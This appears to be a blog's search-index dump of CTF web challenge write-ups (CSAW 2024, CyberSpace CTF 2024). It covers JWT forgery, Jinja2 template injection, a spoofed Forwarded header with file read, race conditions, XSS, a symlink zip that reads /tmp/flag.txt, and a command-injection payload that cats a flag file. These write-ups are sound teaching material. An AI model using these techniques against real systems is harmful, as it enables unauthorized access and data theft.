install the exact same versions of libraries as in the app.\nvboxuser@kali /mnt/repos/csawctf-2024/lost-pyramid $ python3 -m venv venv vboxuser@kali /mnt/repos/csawctf-2024/lost-pyramid $ source ./venv/bin/activate (venv) vboxuser@kali /mnt/repos/csawctf-2024/lost-pyramid $ pip3 install PyJWT==2.3.0 cryptography==43.0.0 Finally, we run the program to generate the JWT.\n(venv) vboxuser@kali /mnt/repos/csawctf-2024/lost-pyramid $ python3 solve.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJST0xFIjoicm95YWx0eSIsIkNVUlJFTlRfREFURSI6IjAzXzA3XzEzNDFfQkMiLCJleHAiOjk2MzMzNjM4NTkzfQ.TNLuFhoPwtH1_ehX-z42hM6nA1UiNNb-PYsyuFhYiwA We copy the generated JWT and access kings_lair with it to get the flag.\nThe final flag is: csawctf{$$king$_confusion$$$}.\n","permalink":"http://localhost:1313/posts/csawctf-2024-lost-pyramid/","summary":"\u003ch2 id=\"initial-code-analysis\"\u003eInitial Code Analysis\u003c/h2\u003e\n\u003cp\u003eFirst thing that catches our eye is the old version \u003cem\u003e2.3.0\u003c/em\u003e of \u003cem\u003ePyJWT\u003c/em\u003e used in the application.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eIn order to access the flag, we need to view \u003cem\u003ekings_lair.html\u003c/em\u003e which requires sending a JWT with specific \u003cem\u003eCURRENT_DATE\u003c/em\u003e and \u003cem\u003eROLE\u003c/em\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-1.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThe scarab room seems vulnerable to SSTI via \u003cem\u003ename\u003c/em\u003e POST param.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapp\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eroute(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/scarab_room\u0026#39;\u003c/span\u003e, methods\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;GET\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;POST\u0026#39;\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003escarab_room\u003c/span\u003e():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e request\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emethod \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;POST\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            name \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e request\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eform\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e name:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                kings_safelist \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;}\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÅπ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÜ£\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄÄ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄÅ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄÇ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄÉ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄÑ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄÖ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄÜ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄá\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄà\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄâ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄä\u0026#39;\u003c/span\u003e, \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄê\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄë\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄí\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄì\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄî\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄï\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄñ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄó\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄò\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄô\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄö\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄõ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄú\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄù\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄû\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄü\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ†\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ°\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ¢\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ£\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ§\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ•\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ¶\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄß\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ®\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ©\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ™\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ´\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ¨\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ≠\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄÆ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄØ\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ∞\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ±\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ≤\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ≥\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ¥\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄµ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ∂\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ∑\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ∏\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄπ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄ∫\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ìÄª\u0026#39;\u003c/span\u003e]  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                name \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ejoin([char \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e char \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e name \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e char\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eisalnum() \u003cspan style=\"color:#f92672\"\u003eor\u003c/span\u003e char \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e kings_safelist])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e render_template_string(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                    \u0026lt;!DOCTYPE html\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                    \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                    \u0026lt;head\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                        OMITTED\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                    \u0026lt;/head\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                    \u0026lt;body\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                        \u0026lt;a href=\u0026#34;{{ url_for(\u0026#39;hallway\u0026#39;) }}\u0026#34; class=\u0026#34;return-link\u0026#34;\u0026gt;RETURN\u0026lt;/a\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                        \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                        {\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e% i\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ef name %}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                            \u0026lt;h1\u0026gt;ìÅπìÅπìÅπ Welcome to the Scarab Room, \u0026#39;\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e name \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u0026#39; ìÅπìÅπìÅπ\u0026lt;/h1\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                        {\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e% e\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003endif %}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                        \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                    \u0026lt;/body\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                    \u0026lt;/html\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                \u0026#39;\u0026#39;\u0026#39;\u003c/span\u003e, name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ename, \u003cspan style=\"color:#f92672\"\u003e**\u003c/span\u003eglobals())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eexcept\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eException\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003epass\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e render_template(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;scarab_room.html\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"leaking-information-via-scarab-room\"\u003eLeaking Information via Scarab Room\u003c/h2\u003e\n\u003cp\u003eSince both \u003cem\u003e{\u003c/em\u003e and \u003cem\u003e}\u003c/em\u003e are in \u003cem\u003ekings_safelist\u003c/em\u003e, we can send a Jinja2 expression in \u003cem\u003ename\u003c/em\u003e to \u003cem\u003escarab_room\u003c/em\u003e. This allows us to leak any alphanumerical global variables by sending \u003cem\u003e{{VARIABLE}}\u003c/em\u003e, since \u003cem\u003e**globals()\u003c/em\u003e are included. Looking at the code, we can leak \u003cem\u003eKINGSDAY\u003c/em\u003e and \u003cem\u003ePUBLICKEY\u003c/em\u003e this way, but not \u003cem\u003ePRIVATE_KEY\u003c/em\u003e, since it contains an underscore which isn\u0026rsquo;t permitted.\u003c/p\u003e","title":"CSAW CTF Qualification Round 2024 Lost Pyramid"},{"content":"Source Code Analysis The goal is to access the GET /flag endpoint which calls an executable that prints out the flag. It\u0026rsquo;s guarded by 2 checks:\nif session[:user] == \u0026quot;admin\u0026quot; if req.ip == \u0026quot;127.0.0.1\u0026quot; There\u0026rsquo;s also an interesting POST /download endpoint. It accepts any session but is also guarded by the if req.ip == \u0026quot;127.0.0.1\u0026quot; check. It serves a file based on filename from our request, which leads to LFI.\nBypassing 127.0.0.1 Restriction The 127.0.0.1 can be trivially bypassed by adding an X-Forwarded-For: 127.0.0.1. This works on local instances but it didn\u0026rsquo;t work on the remote instance during the CTF. As it turned out, the remote instance was behind Google Load Balancer which appended additional forwarded IPs to the header. The server used the last IP in the header for comparison (check the references). Thankfully, Rack supports the Forwarded header, it takes precedence over X-Forwarded headers and is not appended to by the load balancer. In conclusion, we can use Forwarded: for=127.0.0.1 to bypass this restriction.\nLeaking Session Secret and Forging Admin Session We use the 127.0.0.1 bypass and the POST /download endpoint to reveal the contents of server.rb. This file includes a constant server secret used to forge sessions.\nWe HTML decode the secret.\nNow, we could analyze the source code and write our own script for creating the session, but we just opt for replacing the secret in our local instance with the secret from remote.\nFinally, we log in locally as admin, then copy the session, and use it on remote to get the flag.\nThe final flag is: CSCTF{Y0u_G0t_1t_G00d_J0b}.\nReferences https://datatracker.ietf.org/doc/html/rfc7239 https://github.com/rack/rack/pull/1834 ","permalink":"http://localhost:1313/posts/cyberspacectf-2024-notekeeper/","summary":"\u003ch2 id=\"source-code-analysis\"\u003eSource Code Analysis\u003c/h2\u003e\n\u003cp\u003eThe goal is to access the \u003ccode\u003eGET /flag\u003c/code\u003e endpoint which calls an executable that prints out the flag. It\u0026rsquo;s guarded by 2 checks:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eif session[:user] == \u0026quot;admin\u0026quot;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eif req.ip == \u0026quot;127.0.0.1\u0026quot;\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThere\u0026rsquo;s also an interesting \u003ccode\u003ePOST /download\u003c/code\u003e endpoint. It accepts any session but is also guarded by the \u003ccode\u003eif req.ip == \u0026quot;127.0.0.1\u0026quot;\u003c/code\u003e check. It serves a file based on \u003ccode\u003efilename\u003c/code\u003e from our request, which leads to LFI.\u003c/p\u003e","title":"CyberSpace CTF 2024 Notekeeper"},{"content":"Intro This was a series of 3 web challenges (Trendz, Trendzz and Trendzzz) and 1 rev challenge (Trendzzzz) all related to one application. In this post I\u0026rsquo;ll briefly show how I solved all the web challenges related to it.\nRace Condition For POST_FLAG In order to get the POST_FLAG we have to make a request to /flag after we created 12 posts.\nHowever, the CreatePost(...) prevents us from submitting new posts once we\u0026rsquo;ve created 10 of them.\nWhat if we spammed a lot of requests at the same time? We submit 7 posts, then using Burp prepare a parallel single-packet attack submitting a few dozens of requests at once.\nWe check the GET /flag endpoint and find out that we successfully met the requirement of having at least 12 posts.\nFlag: CSCTF{d2426fb5-a93a-4cf2-b353-eac8e0e9cf94}.\n(If the attack fails for you, try again using another account and play around with the number of requests. The parralel single-byte attack should remove the network jitter, but there could still be internal latency at play).\nXSS For ADMIN_FLAG and SUPERADMIN_FLAG The organizers prepared a bot for us that\u0026rsquo;ll make superadmin visit a page with refreshtoken cookie set.\nUsing /getAccessToken?redirect=foo we can make superadmin get an accesstoken using the refreshtoken and navigate to any page we want.\nThe ViewPosts method in SuperAdminDash.go will return viewPost.tmpl without sanitizing data.\nReferences https://portswigger.net/research/smashing-the-state-machine#single-packet-attack https://infosecwriteups.com/hacking-htmx-applications-f8d29665faf ","permalink":"http://localhost:1313/posts/cyberspacectf-2024-trendz/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eThis was a series of 3 web challenges (Trendz, Trendzz and Trendzzz) and 1 rev challenge (Trendzzzz) all related to one application. In this post I\u0026rsquo;ll briefly show how I solved all the web challenges related to it.\u003c/p\u003e\n\u003ch2 id=\"race-condition-for-post_flag\"\u003eRace Condition For POST_FLAG\u003c/h2\u003e\n\u003cp\u003eIn order to get the POST_FLAG we have to make a request to \u003ccode\u003e/flag\u003c/code\u003e  after we created 12 posts.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHowever, the \u003ccode\u003eCreatePost(...)\u003c/code\u003e prevents us from submitting new posts once we\u0026rsquo;ve created 10 of them.\u003c/p\u003e","title":"CyberSpace CTF 2024 Trendz \u0026 Trendzz \u0026 Trendzzz"},{"content":"Initial Inspection After loading the page we\u0026rsquo;re greeted with an upload form for zip archives. We\u0026rsquo;re informed that after uploading we can access the files by appending a filename to a generated UUID.\nWe inspect the code and learn that our uploaded archive will be unzipped using unzip.\nZip With a Symlink We can use the zip command to create an archive that\u0026rsquo;ll preserve symlinks by using the -y option.\nIn order to retrieve the flag we create a symlink to /tmp/flag.txt and zip it. Once we download it, the symlink will be dereferenced on the target machine.\nln -s /tmp/flag.txt flag_symlink zip -y archive.zip flag_symlink We retrieve the flag from https://zipzone-web.challs.csc.tf/files/{RANDOM_UUID}/flag_symlink. The flag is: CSCTF{5yml1nk5_4r3_w31rd}\n","permalink":"http://localhost:1313/posts/cyberspacectf-2024-zip-zone/","summary":"\u003ch2 id=\"initial-inspection\"\u003eInitial Inspection\u003c/h2\u003e\n\u003cp\u003eAfter loading the page we\u0026rsquo;re greeted with an upload form for zip archives. We\u0026rsquo;re informed that after uploading we can access the files by appending a filename to a generated UUID.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eWe inspect the code and learn that our uploaded archive will be unzipped using \u003ccode\u003eunzip\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-1.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"zip-with-a-symlink\"\u003eZip With a Symlink\u003c/h2\u003e\n\u003cp\u003eWe can use the \u003ccode\u003ezip\u003c/code\u003e command to create an archive that\u0026rsquo;ll preserve symlinks by using the \u003ccode\u003e-y\u003c/code\u003e option.\u003c/p\u003e","title":"CyberSpace CTF 2024 Zip Zone"},{"content":"Source Code Analysis The aim of the challenge is to call the POST /feature which contains a command injection vulnerability.\nAs we can see, we need a valid signed access_token that contains the string access_granted.\nThere\u0026rsquo;s GET /release endpoint that\u0026rsquo;ll do exactly that if we pass the validate_server(...) check. Interestingly, if we set a query param debug=true, we can control the validation server address.\nThe validate_server(validation_server) method does the following:\ngets public key from the validation server, makes a GET request to the validation serve verifies the signature in the response using the date and the public key, returns true if the date is after NEW_FEATURE_RELEASE(which is set to 7 days in the future), or false otherwise. Since we can control the verificiation server address and all the data used for verifying the signature comes from it, we can pass date response we want and produce a valid signature for it.\nSetting Up Malicious Validation Server There\u0026rsquo;s already code for the validation server in the distribution file.\nWe copy the code and change the date to 10 days in the future so that it passes the NEW_FEATURE_RELEASE check, then launch the server and expose it globally.\nChaining Everything Together We make a request to GET /release?debug=true with base64-encoded preferences pointing to our validation server.\nWe know the validation succeeded from the Congratulations! The new feature is now available. in the response.\nWe copy the access token and proceed to POST /feature.\nNow we, read the flag by sending text=a;cat%20flag.txt%20# which makes the server type out the flag, and the rest is skipped with a comment: echo a;cat flag.txt # | wc -w.\nThe result flag is: CSCTF{d1d_y0u_71m3_7r4v3l_f0r_7h15_fl46?!}.\n","permalink":"http://localhost:1313/posts/cyberspacectf-2024-feature-unlocked/","summary":"\u003ch2 id=\"source-code-analysis\"\u003eSource Code Analysis\u003c/h2\u003e\n\u003cp\u003eThe aim of the challenge is to call the \u003ccode\u003ePOST /feature\u003c/code\u003e which contains a command injection vulnerability.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-1.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eAs we can see, we need a valid signed \u003ccode\u003eaccess_token\u003c/code\u003e that contains the string \u003ccode\u003eaccess_granted\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eThere\u0026rsquo;s \u003ccode\u003eGET /release\u003c/code\u003e endpoint that\u0026rsquo;ll do exactly that if we pass the \u003ccode\u003evalidate_server(...)\u003c/code\u003e check. Interestingly, if we set a query param \u003ccode\u003edebug=true\u003c/code\u003e, we can control the validation server address.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-2.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e","title":"CyberSpace CTF 2024 Feature Unlocked"},{"content":"Source Code Analysis At first glance, I thought the intended vulnerability was a race condition. However, upon closer examination I noticed a suspicious unset($_SESSION['username']); in logout.php.\nThe correct answer for each question is random, but it\u0026rsquo;s generated in advance both at the beginning of the quiz and upon submitting an answer.\nThe if (intval($answer) === $next_correct) {...} is the essential part of the challenge. Regardless if our answer is correct or wrong, it\u0026rsquo;ll call htmlspecialchars($_SESSION['username']), which will throw an exception if username is unset in the session. However, the exception stack trace will show us which line of code the exception was thrown at. Importantly, this all happens before game-related session data is changed, such as q_num and correct.\nError Line Number Oracle We create a new game, then log out and try submitting an answer (using the same sessionId). Since logout only unsets username, we\u0026rsquo;ll pass the initial check for game data in session, but an exception will be thrown when accessing username.\nThe error Error: [2] Undefined array key \u0026quot;username\u0026quot; - /home/user/quiz.php:53 tells us exactly at which line of code the error has occurred. Since it\u0026rsquo;s 53, it means that the answer we submitted was correct, because the execution entered the if (intval($answer) === $next_correct). If we enter another answer, the execution will enter the else {...} clause instead and throw at line 57.\nWith this, we can check which answer is correct without submitting it. The flow to get the flag is register, login, start the quiz then repeat 25 times: logout -\u0026gt; check which answer is correct (53 in error) -\u0026gt; login -\u0026gt; submit the correct answer.\nThe final flag is: CSCTF{3rr0r5_c4n_b3_0r4c135}.\n","permalink":"http://localhost:1313/posts/cyberspacectf-2024-quiz/","summary":"\u003ch2 id=\"source-code-analysis\"\u003eSource Code Analysis\u003c/h2\u003e\n\u003cp\u003eAt first glance, I thought the intended vulnerability was a race condition. However, upon closer examination I noticed a suspicious \u003ccode\u003eunset($_SESSION['username']);\u003c/code\u003e in \u003ccode\u003elogout.php\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThe correct answer for each question is random, but it\u0026rsquo;s generated in advance both at the beginning of the quiz and upon submitting an answer.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-1.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-2.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003eif (intval($answer) === $next_correct) {...}\u003c/code\u003e is the essential part of the challenge. Regardless if our answer is correct or wrong, it\u0026rsquo;ll call \u003ccode\u003ehtmlspecialchars($_SESSION['username'])\u003c/code\u003e, which will throw an exception if \u003ccode\u003eusername\u003c/code\u003e is unset in the session. However, the exception stack trace will show us which line of code the exception was thrown at. Importantly, this all happens before game-related session data is changed, such as \u003ccode\u003eq_num\u003c/code\u003e and 